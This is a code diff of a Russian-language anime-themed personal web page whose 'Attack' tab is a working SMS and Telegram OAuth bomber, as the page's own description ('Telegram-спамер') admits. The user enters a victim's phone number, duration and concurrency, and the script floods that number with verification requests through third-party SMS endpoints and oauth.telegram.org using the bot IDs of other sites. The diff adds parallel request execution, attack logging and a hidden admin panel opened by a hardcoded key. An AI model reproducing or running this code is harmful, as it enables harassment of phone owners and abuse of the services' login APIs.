@@ -5,16 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   <title>GOD_AE86 ✦ аниме-плеер</title>
   <meta name="description" content="Персональная страница GOD_AE86. Аниме-вайб, неко API и Telegram-спамер.">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/artplayer/dist/artplayer.css">
-  <script src="https://cdn.jsdelivr.net/npm/artplayer/dist/artplayer.js" defer></script>
   <style>
     :root{--bg:#1a1025;--bg2:#22133a;--card:rgba(34,18,58,0.88);--text:#f2deff;--muted:#c9a8e2;--accent:#ffb7c5;--purple:#c77dff;--teal:#a8edea;--border:rgba(199,125,255,0.22);--shadow:0 4px 40px rgba(255,183,197,0.16);--glow:0 0 28px rgba(255,183,197,0.42);--pglow:0 0 28px rgba(199,125,255,0.4);--radius:22px;--tr:0.32s cubic-bezier(.4,0,.2,1);--fh:'Comic Sans MS','Chalkboard SE','Marker Felt',cursive;--fb:system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
     [data-theme="light"]{--bg:#fce8f3;--bg2:#f9d8eb;--card:rgba(255,245,252,0.93);--text:#3a1a2e;--muted:#7a4a68;--accent:#e05a82;--purple:#9b59b6;--border:rgba(224,90,130,0.22);--shadow:0 4px 30px rgba(224,90,130,0.13);--glow:0 0 24px rgba(224,90,130,0.38);--pglow:0 0 24px rgba(155,89,182,0.35)}
     [data-anime="on"]{--accent:#ff4da6;--purple:#bf00ff;--border:rgba(191,0,255,0.32);--shadow:0 4px 50px rgba(255,77,166,0.3);--glow:0 0 40px rgba(255,77,166,0.6);--pglow:0 0 40px rgba(191,0,255,0.55)}
-    *,::before,::after{margin:0;padding:0;box-sizing:border-box}
-    html{scroll-behavior:smooth}
+    *,::before,::after{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
     body{font-family:var(--fb);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;transition:background .5s,color .5s}
-    body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(ellipse 60% 55% at 10% 10%,rgba(199,125,255,.14) 0%,transparent 60%),radial-gradient(ellipse 50% 45% at 90% 85%,rgba(255,183,197,.12) 0%,transparent 55%),radial-gradient(ellipse 40% 40% at 55% 50%,rgba(168,237,234,.05) 0%,transparent 60%);transition:opacity .5s}
+    body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(ellipse 60% 55% at 10% 10%,rgba(199,125,255,.14) 0%,transparent 60%),radial-gradient(ellipse 50% 45% at 90% 85%,rgba(255,183,197,.12) 0%,transparent 55%),radial-gradient(ellipse 40% 40% at 55% 50%,rgba(168,237,234,.05) 0%,transparent 60%)}
     #vfx-canvas{position:fixed;inset:0;pointer-events:none;z-index:0}
     .fixed-top{position:fixed;top:1rem;right:1rem;display:flex;gap:.55rem;z-index:200}
     .icon-btn{width:46px;height:46px;border-radius:50%;background:var(--card);border:1.5px solid var(--border);cursor:pointer;font-size:1.25rem;display:flex;align-items:center;justify-content:center;box-shadow:var(--shadow);backdrop-filter:blur(14px);transition:all var(--tr);color:var(--text)}
@@ -22,10 +19,9 @@
     .page-wrap{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;padding:2.2rem 1rem 5rem;min-height:100vh}
     .container{width:100%;max-width:920px;display:flex;flex-direction:column;gap:1.6rem}
     nav.tabs{display:flex;gap:.55rem;flex-wrap:wrap;padding:.6rem;background:var(--card);border-radius:var(--radius);border:1px solid var(--border);backdrop-filter:blur(14px);box-shadow:var(--shadow)}
-    .tab{flex:1;min-width:70px;background:transparent;border:none;padding:.65rem 1.1rem;border-radius:calc(var(--radius) - 6px);cursor:pointer;font-weight:800;font-family:var(--fh);font-size:.72rem;letter-spacing:.2px;color:var(--muted);transition:all var(--tr);white-space:nowrap;text-align:center}
+    .tab{flex:1;min-width:60px;background:transparent;border:none;padding:.65rem 1.1rem;border-radius:calc(var(--radius) - 6px);cursor:pointer;font-weight:800;font-family:var(--fh);font-size:.7rem;letter-spacing:.2px;color:var(--muted);transition:all var(--tr);white-space:nowrap;text-align:center}
     .tab.active,.tab:hover{background:linear-gradient(135deg,var(--accent) 0%,var(--purple) 100%);color:#fff;box-shadow:0 0 22px rgba(255,183,197,.45);transform:translateY(-2px)}
-    .tab-content{display:none}
-    .tab-content.active{display:block;animation:fadeSlide .42s ease}
+    .tab-content{display:none}.tab-content.active{display:block;animation:fadeSlide .42s ease}
     @keyframes fadeSlide{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
     .card{background:var(--card);border-radius:var(--radius);padding:2rem;box-shadow:var(--shadow);border:1px solid var(--border);backdrop-filter:blur(14px);transition:box-shadow var(--tr),border-color var(--tr);position:relative;overflow:hidden}
     .card::before{content:'';position:absolute;top:-40%;left:-60%;width:38%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.04),transparent);transform:rotate(15deg);animation:shimmer 5s 1s infinite;pointer-events:none}
@@ -73,19 +69,11 @@
     .btn-primary:active{transform:scale(.97)}
     .btn-outline{background:transparent;border:1.5px solid var(--border);color:var(--muted)}
     .btn-outline:hover{border-color:var(--accent);color:var(--accent);background:rgba(255,183,197,.09);transform:translateY(-1px)}
-    .atk-overlay{display:none;position:fixed;inset:0;z-index:300;background:var(--bg);flex-direction:column;align-items:center;justify-content:center;animation:fadeIn .3s}
-    .atk-overlay.active{display:flex}
-    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
-    .atk-timer{font-family:var(--fh);font-size:3.5rem;color:var(--text);display:flex;align-items:baseline;gap:.2rem}
-    .atk-timer small{font-size:1.2rem;color:var(--muted)}
-    .atk-progress{width:80%;height:6px;background:var(--card2);border-radius:4px;margin:1.5rem 0;overflow:hidden}
-    .atk-progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--purple));width:0%;transition:width .3s}
-    .atk-stats{display:flex;gap:2rem;margin-bottom:2rem}
-    .atk-stat{text-align:center}
-    .atk-stat b{font-size:1.8rem;color:var(--text)}
-    .atk-stat small{font-size:.7rem;color:var(--muted);text-transform:uppercase}
-    .atk-stop-btn{padding:.8rem 2.5rem;background:rgba(255,107,107,.1);border:1.5px solid rgba(255,107,107,.3);border-radius:30px;color:#ff6b6b;font-weight:700;cursor:pointer;transition:.2s}
-    .atk-stop-btn:active{transform:scale(.96)}
+    .stats-panel{display:flex;gap:2rem;margin:1rem 0;font-size:.85rem}
+    .stat-item{text-align:center}.stat-item b{font-size:1.5rem;color:var(--text)}.stat-item small{color:var(--muted)}
+    .log-container{max-height:150px;overflow-y:auto;font-size:.75rem;color:var(--muted);margin-bottom:1rem}
+    .admin-panel{display:none;margin-top:1.5rem;padding:1rem;background:rgba(255,107,107,.05);border:1px solid rgba(255,107,107,.2);border-radius:16px}
+    .admin-panel.active{display:block}
     .history-list{margin-top:1.5rem}
     .history-item{background:rgba(199,125,255,.04);border:1px solid var(--border);border-radius:12px;padding:.8rem 1rem;margin-bottom:.5rem;font-size:.8rem}
     .history-item .h-top{display:flex;justify-content:space-between;margin-bottom:.3rem}
@@ -117,35 +105,25 @@
     .neko-tip{background:var(--card);border:1px solid var(--border);color:var(--accent);font-size:.65rem;padding:.25rem .7rem;border-radius:2rem;backdrop-filter:blur(10px);pointer-events:none;opacity:0;transition:opacity .3s;white-space:nowrap;box-shadow:var(--shadow)}
     .neko-corner{width:72px;height:72px;border-radius:50%;border:2.5px solid var(--accent);overflow:hidden;box-shadow:0 0 22px rgba(255,183,197,.55);cursor:pointer;transition:all .3s}
     .neko-corner:hover{transform:scale(1.12);box-shadow:0 0 35px rgba(255,183,197,.75)}
-    .neko-corner:hover + .neko-tip{opacity:1}
+    .neko-corner:hover+.neko-tip{opacity:1}
     .neko-corner img{width:100%;height:100%;object-fit:cover;transition:transform .4s}
     .neko-corner:hover img{transform:scale(1.18)}
-    .tg-service-btn{display:inline-block;margin:.3rem;padding:.5rem 1rem;background:rgba(199,125,255,.08);border:1px solid var(--border);border-radius:20px;color:var(--muted);cursor:pointer;font-size:.8rem;transition:.2s}
-    .tg-service-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
-    .tg-service-btn.used{opacity:.5;pointer-events:none}
-    .admin-panel{display:none;margin-top:1.5rem;padding:1rem;background:rgba(255,107,107,.05);border:1px solid rgba(255,107,107,.2);border-radius:16px}
-    .admin-panel.active{display:block}
     @media (max-width:660px){.profile{flex-direction:column;gap:1.6rem}.bio-name{font-size:1.6rem}.card{padding:1.4rem}.avatar{width:125px;height:125px}.btn{font-size:.76rem;padding:.66rem 1.1rem}#gallery{grid-template-columns:repeat(auto-fill,minmax(120px,1fr))}}
-    ::-webkit-scrollbar{width:6px}
-    ::-webkit-scrollbar-track{background:var(--bg)}
-    ::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px}
+    ::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px}
   </style>
 </head>
 <body>
 <canvas id="vfx-canvas"></canvas>
-
 <div class="fixed-top">
   <button class="icon-btn" id="themeToggle" title="Сменить тему">🌸</button>
   <button class="icon-btn" id="animeModeBtn" title="Аниме-режим">✨</button>
 </div>
-
 <div class="neko-wrap">
   <div class="neko-corner" id="nekoCorner" title="Новый котик!">
     <img id="nekoImg" src="" alt="neko" loading="lazy" style="opacity:0; transition: opacity .5s;">
   </div>
   <div class="neko-tip">🐱 нажми для котика!</div>
 </div>
-
 <div class="page-wrap">
   <div class="container">
     <nav class="tabs">
@@ -194,15 +172,17 @@
       </div>
     </div>
 
-    <!-- ⚡ Attack (объединён с TG Auth) -->
+    <!-- Attack (единая панель) -->
     <div class="tab-content" id="tab-attack">
       <div class="card">
         <div class="attack-title">⚡ ОАтака</div>
+
         <div class="region-chips" id="regionChips">
           <span class="region-chip active" data-r="ru">RU</span>
           <span class="region-chip" data-r="by">BY</span>
           <span class="region-chip" data-r="kz">KZ</span>
         </div>
+
         <div class="form-row">
           <div class="inp-group">
             <label>Номер телефона</label>
@@ -210,17 +190,27 @@
           </div>
           <div class="inp-group">
             <label>Длительность (сек)</label>
-            <input type="number" id="attackDur" value="60" min="10">
+            <input type="number" id="attackDuration" value="60" min="10">
+          </div>
+          <div class="inp-group">
+            <label>Одновременных запросов</label>
+            <input type="number" id="concurrency" value="10" min="1" max="20">
           </div>
         </div>
-        <div style="display:flex; align-items:center; gap:1rem; margin-bottom:1rem; flex-wrap:wrap;">
-          <label style="display:flex; align-items:center; gap:.5rem; color:var(--muted); font-size:.85rem;">
-            <input type="checkbox" id="tgSpawnToggle"> TG OAuth спам
+
+        <div style="display:flex; gap:1rem; margin-bottom:1rem; flex-wrap:wrap;">
+          <label style="display:flex; align-items:center; gap:.3rem; font-size:.8rem; color:var(--muted);">
+            <input type="checkbox" id="enableSms" checked> SMS
+          </label>
+          <label style="display:flex; align-items:center; gap:.3rem; font-size:.8rem; color:var(--muted);">
+            <input type="checkbox" id="enableTg"> Telegram OAuth
           </label>
         </div>
-        <div style="margin-bottom:1rem;" id="tgServiceButtons"></div>
-        <div style="display:flex; gap:1rem; margin-bottom:1.5rem; flex-wrap:wrap;">
-          <button class="btn btn-primary" id="attackStartBtn">▶ Запустить атаку</button>
+
+        <div id="tgServiceList" style="display:none; margin-bottom:1rem; flex-wrap:wrap; gap:.4rem;"></div>
+
+        <div style="display:flex; gap:1rem; margin-bottom:1rem; flex-wrap:wrap;">
+          <button class="btn btn-primary" id="attackStartBtn">▶ Запустить</button>
           <button class="btn btn-outline" id="attackStopBtn" style="display:none;">⏹ Остановить</button>
           <button class="btn btn-outline" id="qrBtn">📱 QR</button>
           <button class="btn btn-outline" id="exportBtn">📤 Экспорт</button>
@@ -228,10 +218,17 @@
           <button class="btn btn-outline" id="clearHistoryBtn">🗑 Сброс истории</button>
         </div>
 
-        <!-- Админ-панель (скрытая) -->
+        <div class="stats-panel">
+          <div class="stat-item"><b id="totalCount">0</b><small> всего</small></div>
+          <div class="stat-item"><b id="successCount" style="color:#5ee8a0;">0</b><small> успешно</small></div>
+          <div class="stat-item"><b id="failCount" style="color:#ff6b6b;">0</b><small> ошибок</small></div>
+        </div>
+        <div class="log-container" id="attackLog"></div>
+
+        <!-- Админ-панель (скрыта) -->
         <div class="admin-panel" id="adminPanel">
           <div class="attack-title">🔑 Админ-панель</div>
-          <p style="color:var(--muted); font-size:.85rem; margin-bottom:1rem;">Блокировка доступа к сайту по IP</p>
+          <p style="color:var(--muted); font-size:.85rem; margin-bottom:1rem;">Блокировка доступа по IP</p>
           <div style="display:flex; gap:.5rem; margin-bottom:1rem;">
             <input type="text" id="banIpInput" placeholder="IP-адрес" style="flex:1; padding:.5rem; background:var(--card); border:1px solid var(--border); border-radius:10px; color:var(--text);">
             <button class="btn btn-outline" id="addBanBtn">Забанить</button>
@@ -248,20 +245,17 @@
       </div>
     </div>
 
-    <!-- 🔍 IP Check -->
+    <!-- IP, Music, Gallery -->
     <div class="tab-content" id="tab-ip">
       <div class="card">
         <div class="attack-title">🔍 Проверка безопасности IP</div>
         <table class="ip-check-table" id="ipTable">
-          <tbody id="ipTableBody">
-            <tr><td>Загрузка...</td><td>⏳</td></tr>
-          </tbody>
+          <tbody id="ipTableBody"><tr><td>Загрузка...</td><td>⏳</td></tr></tbody>
         </table>
         <button class="btn btn-outline" id="refreshIpBtn" style="margin-top:1rem;">🔄 Обновить проверку</button>
       </div>
     </div>
 
-    <!-- Музыка -->
     <div class="tab-content" id="tab-music">
       <div class="card music-wrap">
         <div class="music-title">🎀 Аниме‑Плеер 🎀</div>
@@ -274,7 +268,6 @@
       </div>
     </div>
 
-    <!-- Галерея -->
     <div class="tab-content" id="tab-gallery">
       <div class="card">
         <div class="gallery-title">🎴 Галерея ✶</div>
@@ -285,33 +278,27 @@
   </div>
 </div>
 
-<!-- Оверлей атаки -->
-<div class="atk-overlay" id="atkOverlay">
-  <div style="font-size:1rem; color:var(--accent); margin-bottom:2rem;" id="atkRegionLabel">RU</div>
-  <div class="atk-timer"><span id="atkTimeLeft">60</span><small>s</small></div>
-  <div class="atk-progress"><div class="atk-progress-fill" id="atkProgressFill"></div></div>
-  <div class="atk-stats">
-    <div class="atk-stat"><b id="atkTotal">0</b><small>всего</small></div>
-    <div class="atk-stat"><b id="atkSuccess" style="color:#5ee8a0;">0</b><small>успешно</small></div>
-    <div class="atk-stat"><b id="atkFailed" style="color:#ff6b6b;">0</b><small>ошибок</small></div>
-  </div>
-  <button class="atk-stop-btn" id="atkStopOverlayBtn">⏹ Остановить</button>
-</div>
-
 <script>
-// ========== КОНФИГУРАЦИЯ СЕРВИСОВ TG OAUTH ==========
-const tgAuthServices = [
-  { name: 'FRAGMENT', bot_id: '5444323279', origin: 'https://fragment.com' },
-  { name: 'KUPIKOD', bot_id: '5731754199', origin: 'https://steam.kupikod.com' },
-  { name: 'COMBOT', bot_id: '210944655', origin: 'https://combot.org' },
-  { name: 'TELEGRAMBOT.BIZ', bot_id: '319709511', origin: 'https://telegrambot.biz' },
-  { name: 'BOT-T', bot_id: '1199558236', origin: 'https://bot-t.com' },
-  { name: 'LZT.MARKET', bot_id: '5709824482', origin: 'https://lzt.market' },
-  { name: 'TG-STORE', bot_id: '1803424014', origin: 'https://ru.telegram-store.com' },
-  { name: 'SPOT.UZ', bot_id: '5463728243', origin: 'https://www.spot.uz' },
-  { name: '1WIN', bot_id: '6708902161', origin: 'https://ourauthpoint777.com' },
-  { name: 'PRESSCODE', bot_id: '1852523856', origin: 'https://cabinet.presscode.app' }
-];
+// ========== ЗАГРУЗКА ДАННЫХ ==========
+let smsServices = { ru: [], by: [], kz: [] };
+let tgOAuthServices = [];
+
+async function loadServices() {
+  try {
+    const resp = await fetch('services.json');
+    if (!resp.ok) throw new Error('Failed to load services.json');
+    const data = await resp.json();
+    smsServices = data.sms || { ru: [], by: [], kz: [] };
+    tgOAuthServices = data.tgOAuth || [];
+    populateTgList();
+    console.log('Сервисы загружены');
+  } catch (e) {
+    console.error('Ошибка загрузки сервисов:', e);
+    // fallback – минимальные списки
+    smsServices = { ru: [], by: [], kz: [] };
+    tgOAuthServices = [];
+  }
+}
 
 // ========== CANVAS VFX ==========
 const canvas = document.getElementById('vfx-canvas');
@@ -444,7 +431,7 @@ document.querySelectorAll('.tab').forEach(tab => {
     document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
     document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
     if (tab.dataset.tab === 'bio') fetchQuote();
-    if (tab.dataset.tab === 'attack') { renderHistory(); populateTgServiceButtons(); }
+    if (tab.dataset.tab === 'attack') renderHistory();
     if (tab.dataset.tab === 'ip') runIpCheck();
   });
 });
@@ -551,64 +538,24 @@ document.getElementById('audioPlayer').addEventListener('error', () => {
   document.getElementById('audioFallback').style.display = 'block';
 });
 
-// ========== TG OAUTH КНОПКИ (внутри Attack) ==========
-function populateTgServiceButtons() {
-  const container = document.getElementById('tgServiceButtons');
-  container.innerHTML = '';
-  tgAuthServices.forEach(svc => {
-    const btn = document.createElement('button');
-    btn.className = 'tg-service-btn';
-    btn.textContent = svc.name;
-    btn.addEventListener('click', () => sendSingleTgOAuth(svc));
-    container.appendChild(btn);
-  });
-}
-
-async function sendSingleTgOAuth(service) {
-  const phone = document.getElementById('attackPhone').value.trim();
-  if (!phone) return alert('Введите номер телефона');
-  const url = 'https://oauth.telegram.org/auth/request';
-  const headers = {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'X-Requested-With': 'XMLHttpRequest',
-    'Origin': 'https://oauth.telegram.org',
-    'Referer': 'https://oauth.telegram.org/auth'
-  };
-  const body = new URLSearchParams({
-    phone: phone,
-    bot_id: service.bot_id,
-    origin: service.origin,
-    request_access: 'write',
-    return_to: 'https://fragment.com/'
-  });
-  try {
-    await fetch(url, { method: 'POST', headers, body, mode: 'no-cors' });
-    console.log(`[${service.name}] OK`);
-  } catch(e) {
-    console.error(`[${service.name}] ERR`, e);
-  }
-}
-
-// ========== ЗАГРУЗКА services.json ==========
-let servicesDB = { ru: [], by: [], kz: [] };
-(async function loadServices() {
-  try {
-    const resp = await fetch('services.json');
-    if (resp.ok) {
-      const data = await resp.json();
-      if (data && typeof data === 'object') {
-        ['ru','by','kz'].forEach(region => {
-          if (Array.isArray(data[region])) servicesDB[region] = data[region];
-        });
-      }
-    }
-  } catch(e) { console.warn('services.json не загружен'); }
-})();
+// ========== ЛОГИКА АТАКИ ==========
+let attackRunning = false;
+let attackAbortController = null;
+let stats = { total: 0, success: 0, failed: 0 };
+let startTime = null;
+let duration = 60;
+let concurrency = 10;
 
 function formatPhone(phone, type) {
   const clean = phone.replace(/\D/g, '');
   switch(type) {
-    case 'wp': case 'cp': case 'ru': case 'sp': return '+' + clean;
+    case 'wp': return '+' + clean;
+    case 'nc': return clean.slice(1);
+    case 'cp': return clean.slice(1, 4);
+    case 'ru': return '+' + clean;
+    case 'sp': return '+' + clean;
+    case 'pm': return clean.slice(1, 4) + '-' + clean.slice(4, 7) + '-' + clean.slice(7, 9) + '-' + clean.slice(9, 11);
+    case 'bf': return clean.replace(/^7/, '8');
     default: return clean;
   }
 }
@@ -633,17 +580,13 @@ async function sendServiceRequest(service, phone, signal) {
   let body = null;
   if (service.params && Object.keys(service.params).length > 0) {
     const urlObj = new URL(url);
-    Object.entries(service.params).forEach(([k, v]) => {
-      urlObj.searchParams.set(k, applyPlaceholders(String(v), phone));
-    });
+    Object.entries(service.params).forEach(([k, v]) => urlObj.searchParams.set(k, applyPlaceholders(String(v), phone)));
     url = urlObj.toString();
   } else {
     url = applyPlaceholders(url, phone);
   }
   if (service.headers) {
-    Object.entries(service.headers).forEach(([k, v]) => {
-      headers[k] = applyPlaceholders(String(v), phone);
-    });
+    Object.entries(service.headers).forEach(([k, v]) => headers[k] = applyPlaceholders(String(v), phone));
   }
   if (service.type === 'json') {
     body = JSON.stringify(service.body);
@@ -651,9 +594,7 @@ async function sendServiceRequest(service, phone, signal) {
     body = applyPlaceholders(body, phone);
   } else if (service.type === 'form' && service.body) {
     const params = new URLSearchParams();
-    Object.entries(service.body).forEach(([k, v]) => {
-      params.append(k, applyPlaceholders(String(v), phone));
-    });
+    Object.entries(service.body).forEach(([k, v]) => params.append(k, applyPlaceholders(String(v), phone)));
     body = params.toString();
     headers['Content-Type'] = 'application/x-www-form-urlencoded';
   }
@@ -666,134 +607,124 @@ async function sendServiceRequest(service, phone, signal) {
   }
 }
 
-async function sendTgOAuthRequest(service, phone, signal) {
-  const url = 'https://oauth.telegram.org/auth/request';
-  const headers = {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'X-Requested-With': 'XMLHttpRequest',
-    'Origin': 'https://oauth.telegram.org',
-    'Referer': 'https://oauth.telegram.org/auth'
-  };
-  const body = new URLSearchParams({
-    phone: phone,
-    bot_id: service.bot_id,
-    origin: service.origin,
-    request_access: 'write',
-    return_to: 'https://fragment.com/'
-  });
-  try {
-    await fetch(url, { method: 'POST', headers, body, mode: 'no-cors', signal });
-    return true;
-  } catch (err) {
-    if (err.name === 'AbortError') throw err;
-    return false;
+async function sendTgOAuthRequest(svc, phone, signal) {
+  if (svc.bot_id) {
+    const url = 'https://oauth.telegram.org/auth/request';
+    const body = new URLSearchParams({
+      phone, bot_id: svc.bot_id, origin: svc.origin,
+      embed: svc.embed || '1', request_access: svc.request_access || 'write',
+      return_to: svc.return_to || 'https://fragment.com/'
+    });
+    try {
+      await fetch(url, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded', 'X-Requested-With':'XMLHttpRequest' }, body, mode:'no-cors', signal });
+      return true;
+    } catch(e) {
+      if (e.name === 'AbortError') throw e;
+      return false;
+    }
   }
+  if (svc.url) return sendServiceRequest(svc, phone, signal);
+  return false;
 }
 
-let attackRunning = false;
-let attackAbortController = null;
-let attackStats = { total: 0, success: 0, failed: 0 };
-let attackStartTime = null;
-let attackDuration = 0;
-let attackRegion = 'ru';
-let tgIndex = 0; // для чередования TG-сервисов
+async function executeTasks(tasks, phone, signal, limit) {
+  const executing = [];
+  const total = tasks.length;
+  let idx = 0;
+  const results = [];
+  const enqueue = async () => {
+    while (idx < total) {
+      const i = idx++;
+      const p = tasks[i]().then(ok => {
+        executing.splice(executing.indexOf(p), 1);
+        stats.total++;
+        ok ? stats.success++ : stats.failed++;
+        updateStatsDisplay();
+      });
+      executing.push(p);
+      results.push(p);
+      if (executing.length >= limit) await Promise.race(executing);
+    }
+  };
+  await enqueue();
+  await Promise.all(executing);
+}
 
-document.getElementById('attackStartBtn').addEventListener('click', startAttack);
-document.getElementById('attackStopBtn').addEventListener('click', stopAttack);
-document.getElementById('atkStopOverlayBtn').addEventListener('click', stopAttack);
+function logUpdate(msg, color) {
+  const log = document.getElementById('attackLog');
+  const div = document.createElement('div');
+  div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  div.style.color = color || 'var(--muted)';
+  log.appendChild(div);
+  log.scrollTop = log.scrollHeight;
+}
 
-function startAttack() {
+function updateStatsDisplay() {
+  document.getElementById('totalCount').textContent = stats.total;
+  document.getElementById('successCount').textContent = stats.success;
+  document.getElementById('failCount').textContent = stats.failed;
+}
+
+async function startAttack() {
   if (attackRunning) return;
   const phone = document.getElementById('attackPhone').value.trim();
-  if (!phone) return alert('Введите номер телефона');
+  if (!phone) return alert('Введите номер');
 
-  // Админ-ключ
   if (phone === 'hacklam787') {
     document.getElementById('adminPanel').classList.toggle('active');
     updateAdminPanel();
     return;
   }
 
-  const useTg = document.getElementById('tgSpawnToggle').checked;
-  attackDuration = parseInt(document.getElementById('attackDur').value) || 60;
-  attackRegion = document.querySelector('#regionChips .region-chip.active')?.dataset.r || 'ru';
-  const services = servicesDB[attackRegion] || [];
-  if (!services.length && !useTg) {
-    alert('Нет сервисов для региона ' + attackRegion.toUpperCase());
-    return;
+  duration = parseInt(document.getElementById('attackDuration').value) || 60;
+  concurrency = parseInt(document.getElementById('concurrency').value) || 10;
+  const region = document.querySelector('#regionChips .region-chip.active')?.dataset.r || 'ru';
+  const smsEnabled = document.getElementById('enableSms').checked;
+  const tgEnabled = document.getElementById('enableTg').checked;
+
+  const tasks = [];
+  if (smsEnabled) {
+    const services = smsServices[region] || [];
+    services.forEach(svc => tasks.push(() => sendServiceRequest(svc, phone, attackAbortController.signal)));
   }
+  if (tgEnabled) {
+    tgOAuthServices.forEach(svc => tasks.push(() => sendTgOAuthRequest(svc, phone, attackAbortController.signal)));
+  }
+  if (tasks.length === 0) return alert('Нет активных сервисов');
 
   attackRunning = true;
   attackAbortController = new AbortController();
-  attackStats = { total: 0, success: 0, failed: 0 };
-  attackStartTime = Date.now();
-  tgIndex = 0;
-
+  stats = { total: 0, success: 0, failed: 0 };
+  startTime = Date.now();
+  updateStatsDisplay();
+  logUpdate(`Старт атаки (${tasks.length} сервисов, concurrency=${concurrency})`);
   document.getElementById('attackStartBtn').style.display = 'none';
   document.getElementById('attackStopBtn').style.display = 'inline-block';
-  document.getElementById('atkRegionLabel').textContent = attackRegion.toUpperCase();
-  document.getElementById('atkTimeLeft').textContent = attackDuration;
-  document.getElementById('atkProgressFill').style.width = '0%';
-  document.getElementById('atkTotal').textContent = '0';
-  document.getElementById('atkSuccess').textContent = '0';
-  document.getElementById('atkFailed').textContent = '0';
-  document.getElementById('atkOverlay').classList.add('active');
 
-  (async () => {
-    try {
-      while (attackRunning && (Date.now() - attackStartTime) < attackDuration * 1000) {
-        // Проходим основные сервисы
-        for (const svc of services) {
-          if (!attackRunning) break;
-          attackStats.total++;
-          const ok = await sendServiceRequest(svc, phone, attackAbortController.signal);
-          if (ok) attackStats.success++;
-          else attackStats.failed++;
-          if (attackStats.total % 5 === 0) updateStatsDisplay();
-          await new Promise(r => setTimeout(r, 50));
-        }
-        // Если включён TG-спам, добавляем по одному TG-сервису за цикл
-        if (useTg && tgAuthServices.length > 0) {
-          if (!attackRunning) break;
-          const tgSvc = tgAuthServices[tgIndex % tgAuthServices.length];
-          attackStats.total++;
-          const tgOk = await sendTgOAuthRequest(tgSvc, phone, attackAbortController.signal);
-          if (tgOk) attackStats.success++;
-          else attackStats.failed++;
-          tgIndex++;
-          if (attackStats.total % 5 === 0) updateStatsDisplay();
-          await new Promise(r => setTimeout(r, 50));
-        }
-      }
-    } catch(e) {}
-    stopAttack();
-  })();
+  try {
+    while (attackRunning && (Date.now() - startTime) < duration * 1000) {
+      await executeTasks(tasks, phone, attackAbortController.signal, concurrency);
+      await new Promise(r => setTimeout(r, 100));
+    }
+    logUpdate('Атака завершена по времени', '#5ee8a0');
+  } catch(e) {
+    logUpdate('Атака остановлена', '#ff6b6b');
+  }
+  stopAttack(true);
 }
 
-function updateStatsDisplay() {
-  document.getElementById('atkTotal').textContent = attackStats.total;
-  document.getElementById('atkSuccess').textContent = attackStats.success;
-  document.getElementById('atkFailed').textContent = attackStats.failed;
-}
-
-function stopAttack() {
+function stopAttack(silent = false) {
+  if (!attackRunning) return;
   attackRunning = false;
-  if (attackAbortController) attackAbortController.abort();
-  attackAbortController = null;
+  attackAbortController.abort();
   document.getElementById('attackStartBtn').style.display = '';
   document.getElementById('attackStopBtn').style.display = 'none';
-  document.getElementById('atkOverlay').classList.remove('active');
-
+  if (!silent) logUpdate('Остановлено пользователем');
   const phone = document.getElementById('attackPhone').value.trim();
-  if (phone && phone !== 'hacklam787' && attackStats.total > 0) {
+  if (phone && phone !== 'hacklam787' && stats.total > 0) {
     const record = {
-      date: new Date().toLocaleString('ru'),
-      phone,
-      region: attackRegion,
-      duration: attackDuration,
-      total: attackStats.total,
-      success: attackStats.success,
-      failed: attackStats.failed
+      date: new Date().toLocaleString('ru'), phone, type: 'unified',
+      total: stats.total, success: stats.success, failed: stats.failed
     };
     let hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
     hist.unshift(record);
@@ -803,45 +734,33 @@ function stopAttack() {
   }
 }
 
-setInterval(() => {
-  if (!attackRunning) return;
-  const elapsed = (Date.now() - attackStartTime) / 1000;
-  const left = Math.max(0, attackDuration - Math.floor(elapsed));
-  document.getElementById('atkTimeLeft').textContent = left;
-  document.getElementById('atkProgressFill').style.width = Math.min(100, Math.round((elapsed / attackDuration) * 100)) + '%';
-}, 200);
+document.getElementById('attackStartBtn').addEventListener('click', startAttack);
+document.getElementById('attackStopBtn').addEventListener('click', () => stopAttack());
 
-function renderHistory() {
-  const hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
-  const container = document.getElementById('historyEntries');
-  if (!hist.length) {
-    container.innerHTML = '<div style="color:var(--muted)">Нет завершённых атак</div>';
-    return;
-  }
-  container.innerHTML = hist.map(h => `
-    <div class="history-item">
-      <div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.region}</span></div>
-      <div class="h-stats">
-        <span class="ok">✓${h.success}</span>
-        <span class="fail">✗${h.failed}</span>
-        <span>${h.total ? Math.round(h.success*100/h.total) : 0}%</span>
-        <span>${h.duration}s</span>
-      </div>
-      <div style="font-size:.7rem; margin-top:.2rem;">${h.date}</div>
-    </div>
-  `).join('');
-}
-renderHistory();
-populateTgServiceButtons();
-
-document.getElementById('qrBtn').addEventListener('click', () => {
-  const phone = document.getElementById('attackPhone').value.trim();
-  if (!phone) return alert('Введите номер');
-  window.open(`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=tel:${encodeURIComponent(phone)}`, '_blank');
+// UI для TG сервисов
+document.getElementById('enableTg').addEventListener('change', function() {
+  document.getElementById('tgServiceList').style.display = this.checked ? 'flex' : 'none';
 });
 
+function populateTgList() {
+  const list = document.getElementById('tgServiceList');
+  list.innerHTML = tgOAuthServices.map(svc => `
